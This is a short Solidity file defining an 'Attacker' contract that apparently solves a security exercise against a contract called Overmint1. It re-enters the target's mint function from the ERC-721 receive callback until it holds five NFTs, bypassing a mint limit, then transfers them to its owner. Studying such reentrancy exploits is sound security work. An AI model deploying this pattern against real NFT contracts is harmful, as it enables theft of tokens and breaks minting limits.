// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint1.sol";

contract Attacker is IERC721Receiver {
    address public nftAddress;
    address public owner;

    constructor(address _nftAddress) {
        nftAddress = _nftAddress;
        owner = msg.sender;
    }

    function mint() public {
        // start initial mint
        Overmint1(nftAddress).mint();
    }

    function onERC721Received(address, address, uint256, bytes calldata) public returns (bytes4) {
        // re-enter until the contract has 5 NFTs
        if (Overmint1(nftAddress).balanceOf(address(this)) < 5) {
            Overmint1(nftAddress).mint();
        }
        return this.onERC721Received.selector;
    }

    function transfer(uint256 index) public {
        // transfer the NFTs to the owner
        Overmint1(nftAddress).transferFrom(address(this), owner, index);
    }
}
